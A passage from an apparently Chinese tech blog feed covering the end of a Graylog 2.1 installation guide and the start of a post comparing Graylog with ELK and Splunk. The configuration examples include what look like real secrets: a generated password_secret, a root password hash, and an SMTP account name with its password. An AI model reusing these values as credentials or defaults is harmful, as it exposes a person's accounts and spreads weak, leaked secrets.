&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum install -y pwgen&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pwgen -N 1 &lt;span class=&quot;_&quot;&gt;-s&lt;/span&gt; 96       H1R5v17kWtyDxj2PzxLMxu41D6HDt9JzhfZcj6QlCURVddgkLAdnUmpkdIscmmu4ELKsTrHwKvPmxFKSYyTn0YlqebbpQqyr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    password_secret = H1R5v17kWtyDxj2PzxLMxu41D6HDt9JzhfZcj6QlCURVddgkLAdnUmpkdIscmmu4ELKsTrHwKvPmxFKSYyTn0YlqebbpQqyr&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中root_password_sha2 的值使用命令生成&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; -n Ihaozhuo_b313 | sha256sum  (这里对密码123456哈希加密)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;fc&lt;/span&gt;88c28d48b0cb97f3fb5286cc35c520409ef037acd30ec687f0c0bd3d5a5115 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root_password_sha2 = &lt;span class=&quot;built_in&quot;&gt;fc&lt;/span&gt;88c28d48b0cb97f3fb5286cc35c520409ef037acd30ec687f0c0bd3d5a5115&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elasticsearch_cluster_name 值必须是elasticsearch配置文件中的cluster_name&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch_cluster_name = graylog&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elasticsearch_discovery_zen_ping_unicast_hosts 填写elasticsearch地址，如果是多个，用逗号隔开&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch_discovery_zen_ping_unicast_hosts = 192.168.1.234:9300&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elasticsearch_discovery_zen_ping_multicast_enabled = false 多播模式关闭&lt;/p&gt;
&lt;p&gt;由于我们只有一个Elasticsearch shard，需要把elasticsearch_shards参数设置为1：&lt;br&gt;elasticsearch集群分片数量&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch_shards = 1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elasticsearch绑定的节点IP&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;299 elasticsearch_network_host = 192.168.1.234&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;300 elasticsearch_network_bind_host = 192.168.1.234&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;301 elasticsearch_network_publish_host = 192.168.1.234&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;mongodb安装服务的ip地址&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mongodb_uri = mongodb://192.168.1.234/graylog&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里mongodb是安装在我同一台服务器上面的。如果要把mongodb单独服务器跑连接方式配置文件里面也有例子说明：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mongodb_uri =mongodb://graylog:123456@160.17.2.251:27017/graylog2             &lt;span class=&quot;comment&quot;&gt;#连接到mongodb的服务器地址为160.17.2.251:27017，账号为graylog，密码为123456 数据库为graylog2&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt; 设置告警邮件发送者信息&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;# Email transport&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_enabled = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_hostname = smtp.exmail.qq.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_port = 465&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_use_auth = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_use_tls = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_use_ssl = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_auth_username = chengyangyang@qq.cn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_auth_password = beneTqq&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_subject_prefix = [graylog]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;transport_email_from_email = chengyangyang@qq.cn&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(4)复制配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 因为graylog安装bin目录下，默认启动配置文件&lt;/p&gt;
&lt;p&gt;配置文件路径：&lt;code&gt;/etc/graylog/server/server.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;所以需要将&lt;code&gt;graylog.conf.example&lt;/code&gt; 复制到&lt;code&gt;/etc/graylog/server/&lt;/code&gt;目录下，并且改名 &lt;code&gt;server.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;执行命令：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mkdir -p /etc/graylog/server/ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cp graylog.conf.example /etc/graylog/server/server.conf&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(5)启动graylog&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在graylog安装bin目录下执行&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;./graylogctl start&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;查看日志，在graylog安装目录下执行&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;tail -200f /&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/graylog-server.log&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果报错：&lt;/p&gt;
&lt;p&gt;原因：&lt;/p&gt;
&lt;p&gt;在mongodb版本2.6之后，是需要日志journaling设置的，而默认情况下是关闭的&lt;/p&gt;
&lt;p&gt;解决办法：&lt;/p&gt;
&lt;p&gt;在mongodb启动命令加上 –journal&lt;/p&gt;
&lt;p&gt;最后启动命令：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;./mongod --dbpath=/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/mongodb/data/ --fork --logpath=/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/mongodb/logs --storageEngine=mmapv1 --journal&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;重启mongodb后，重启graylog服务即可！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(6)启动graylog(报错二)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;查看日志，在graylog安装目录下执行&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tail -200f /&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/graylog-server.log&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;com.mongodb.MongoSocketOpenException: Exception opening socket&amp;#125;, caused by &amp;#123;java.net.ConnectException: 拒绝连接&amp;#125;&amp;#125;]&amp;#125;. Waiting &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 30000 ms before timing out&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,355 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Elastic Beats Input 1.1.1 [org.graylog.plugins.beats.BeatsInputPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,357 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Collector 1.1.1 [org.graylog.plugins.collector.CollectorPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,357 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Enterprise Integration Plugin 1.1.1 [org.graylog.plugins.enterprise_integration.EnterpriseIntegrationPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,358 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: MapWidgetPlugin 1.1.1 [org.graylog.plugins.map.MapWidgetPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,359 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Pipeline Processor Plugin 1.1.1 [org.graylog.plugins.pipelineprocessor.ProcessorPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,359 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Anonymous Usage Statistics 2.1.1 [org.graylog.plugins.usagestatistics.UsageStatsPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,487 INFO : org.graylog2.bootstrap.CmdLineTool - Running with JVM arguments: -Djava.library.path=./../lib/sigar -Xms1g -Xmx1g -XX:NewRatio=1 -XX:+ResizeTLAB -XX:+UseConcMarkSweepGC -XX:+CMSConcurrentMTEnabled -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:-OmitStackTraceInFastThrow&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;提示mongodb 拒绝连接。 这个时候需要看下端口地址是否是IP地址还是127.0.0.1 如果不是需要修改下在重启服务就可以了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看启动服务端口：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog graylog-2.1.1]&lt;span class=&quot;comment&quot;&gt;# netstat -ntulp&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Active Internet connections (only servers)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:27017             0.0.0.0:*                   LISTEN      22308/mongod&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      1974/sshd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      1287/master&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 ::ffff:192.168.1.234:9350   :::*                        LISTEN      23642/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 ::ffff:192.168.1.234:9000   :::*                        LISTEN      23642/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 ::ffff:192.168.1.234:9200   :::*                        LISTEN      18405/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 ::ffff:192.168.1.234:9300   :::*                        LISTEN      18405/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 :::22                       :::*                        LISTEN      1974/sshd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 ::1:25                      :::*                        LISTEN      1287/master&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(6)访问graylog&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;graylog启动成功后，浏览器访问：&lt;strong&gt;graylog安装IP:9000&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;四：总结&quot;&gt;&lt;a href=&quot;#四：总结&quot; class=&quot;headerlink&quot; title=&quot;四：总结&quot;&gt;&lt;/a&gt;四：总结&lt;/h3&gt;&lt;p&gt;到此，基础的集中日志管理graylog安装完毕！，后续将继续介绍：&lt;/p&gt;
&lt;p&gt;安装部署Graylog Collector Sidecar 收集应用日志&lt;/p&gt;
&lt;p&gt;采用syslog收集日志方式&lt;/p&gt;
&lt;p&gt;graylog一些使用，包括日志截取，告警等。&lt;/p&gt;
&lt;p&gt;之前也实践过ELK技术栈，后来选型graylog，是基于graylog带有的权限管理，和告警功能比较完善！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;graylog-升级2-1-集中日志解决方案&quot;&gt;&lt;a href=&quot;#graylog-升级2-1-集中日志解决方案&quot; class=&quot;headerlink&quot; title=&quot;graylog 升级2.1 集中日志解决方案&quot;&gt;&lt;/a&gt;graylog 升级2.1 集中日志解决
    
    </summary>
    
      <category term="日志分析平台" scheme="http://blog.yangcvo.me/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"/>
    
    
      <category term="Log analysis platform" scheme="http://blog.yangcvo.me/tags/Log-analysis-platform/"/>
    
  </entry>
  
  <entry>
    <title>Graylog——日志分析平台完美代替Elasticsearch</title>
    <link href="http://blog.yangcvo.me/2016/11/13/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%10%E5%B9%B3%E5%8F%B0/Graylog/Graylog%E2%80%94%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E5%AE%8C%E7%BE%8E%E4%BB%A3%E6%9B%BFElasticsearch/"/>
    <id>http://blog.yangcvo.me/2016/11/13/日志分析平台/Graylog/Graylog—日志分析平台完美代替Elasticsearch/</id>
    <published>2016-11-13T09:56:03.000Z</published>
    <updated>2017-03-14T05:48:57.000Z</updated>
    
    <content type="html">&lt;p&gt;摘要: 提起日志聚合工具，有开源界的ELK，商业界的Splunk，但我要介绍开源的后起之秀Graylog，可以说是龙头老大Splunk的开源版。&lt;/p&gt;
&lt;h1 id=&quot;Graylog——日志分析平台完美代替Elasticsearch&quot;&gt;&lt;a href=&quot;#Graylog——日志分析平台完美代替Elasticsearch&quot; class=&quot;headerlink&quot; title=&quot;Graylog——日志分析平台完美代替Elasticsearch&quot;&gt;&lt;/a&gt;Graylog——日志分析平台完美代替Elasticsearch&lt;/h1&gt;&lt;p&gt;先看看 推荐！&lt;a href=&quot;https://my.oschina.net/HeAlvin/blog/378262&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;国外程序员整理的系统管理员资源大全&lt;/a&gt; 中，国外程序员整理的日志聚合工具的列表：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;日志管理工具：收集，解析，可视化&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Elasticsearch - 一个基于Lucene的文档存储，主要用于日志索引、存储和分析。&lt;/li&gt;
&lt;li&gt;Fluentd - 日志收集和发出&lt;/li&gt;
&lt;li&gt;Flume -分布式日志收集和聚合系统&lt;/li&gt;
&lt;li&gt;Graylog2 -具有报警选项的可插入日志和事件分析服务器&lt;/li&gt;
&lt;li&gt;Heka -流处理系统，可用于日志聚合&lt;/li&gt;
&lt;li&gt;Kibana - 可视化日志和时间戳数据&lt;/li&gt;
&lt;li&gt;Logstash -管理事件和日志的工具&lt;/li&gt;
&lt;li&gt;Octopussy -日志管理解决方案（可视化/报警/报告）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Graylog与ELK方案的对比&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ELK： Logstash -&amp;gt; Elasticsearch -&amp;gt; Kibana （使用了一些插件head ，marvel）&lt;/li&gt;
&lt;li&gt;Graylog： Graylog Collector -&amp;gt; Graylog Server(封装Elasticsearch) -&amp;gt; Graylog Web&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Graylog.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;做为运维，公司内部使用elk处理日志发现很多问题。&lt;/p&gt;
&lt;p&gt;顺便截图了几张：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog-elk.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog-elk1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;之前试过Logstash + Elasticsearch + Kibana的方案，发现有几个缺点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;不能处理多行日志，比如Mysql慢查询，Tomcat/Jetty应用的Java异常打印&lt;/li&gt;
&lt;li&gt;不能保留原始日志，只能把原始日志分字段保存，这样搜索日志结果是一堆Json格式文本，无法阅读。&lt;/li&gt;
&lt;li&gt;不复合正则表达式匹配的日志行，被全部丢弃。&lt;/li&gt;
&lt;li&gt;kibana结合使用经常会出现卡死。资源消耗非常大。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;本着解决以上3个缺点的原则，再次寻找替代方案。 首先找到了商业日志工具Splunk，号称日志界的Google，意思是全文搜索日志的能力，不光能解决以上3个缺点，还提供搜索单词高亮显示，不同错误级别日志标色等吸引人的特性，但是免费版有500M限制，付费版据说要3万美刀，只能放弃，继续寻找。 最后找到了Graylog，第一眼看到Graylog，只是系统日志syslog的采集工具，一点也没吸引到我。但后来深入了解后，才发现Graylog简直就是开源版的Splunk。 我自己总结的Graylog吸引人的地方：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一体化方案，安装方便，不像ELK有3个独立系统间的集成问题。&lt;/li&gt;
&lt;li&gt;采集原始日志，并可以事后再添加字段，比如http_status_code，response_time等等。&lt;/li&gt;
&lt;li&gt;自己开发采集日志的脚本，并用curl/nc发送到Graylog Server，发送格式是自定义的GELF，Flunted和Logstash都有相应的输出GELF消息的插件。自己开发带来很大的自由度。实际上只需要用inotifywait监控日志的modify事件，并把日志的新增行用curl/netcat发送到Graylog Server就可。&lt;/li&gt;
&lt;li&gt;搜索结果高亮显示，就像google一样。&lt;/li&gt;
&lt;li&gt;搜索语法简单，比如： source:mongo AND reponse_time_ms:&amp;gt;5000，避免直接输入elasticsearch搜索json语法&lt;/li&gt;
&lt;li&gt;搜索条件可以导出为elasticsearch的搜索json文本，方便直接开发调用elasticsearch rest api的搜索脚本。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Graylog图解&lt;/p&gt;
&lt;p&gt;Graylog开源版官网： &lt;a href=&quot;https://www.graylog.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.graylog.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来几张官网的截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.graylog.org/assets/itops_full-87fe2811ab676116142c145affa95b902635b1d6da99718057e8ae9d45c15007.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.graylog.org/assets/overview_dashboard-3817012f923d4a00e9bde1c0547796319cf0396149464f434cfc2ae83a9da826.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Graylog是强大的日志管理、分析工具。它基于 Elasticsearch, Java和MongoDB。&lt;/p&gt;
&lt;p&gt;Graylog可以收集监控多种不同应用的日志。但是为了示范说明，我只收集syslog。并且，我将会把用到的组件全部安装到一个单独的服务器上。对于大型、生产系统你可以把组件分开安装在不同的服务器上，这样可以提高效率。&lt;/p&gt;
&lt;h3 id=&quot;Graylog的组件&quot;&gt;&lt;a href=&quot;#Graylog的组件&quot; class=&quot;headerlink&quot; title=&quot;Graylog的组件&quot;&gt;&lt;/a&gt;Graylog的组件&lt;/h3&gt;&lt;p&gt;Graylog有4个基本组件：&lt;/p&gt;
